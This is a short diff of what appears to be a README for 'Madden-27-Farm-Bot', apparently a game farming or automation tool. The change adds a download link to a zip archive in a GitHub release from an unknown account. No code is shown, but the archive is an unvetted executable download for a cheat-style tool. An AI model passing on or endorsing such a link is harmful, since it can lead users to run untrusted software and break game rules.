@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download Madden-27-Farm-Bot]()**
+**[Download Madden-27-Farm-Bot](https://github.com/Openoolead99/Madden-27-Farm-Bot/releases/download/765765/Madden-27-Farm-Bot.zip)**
 
 ---
 
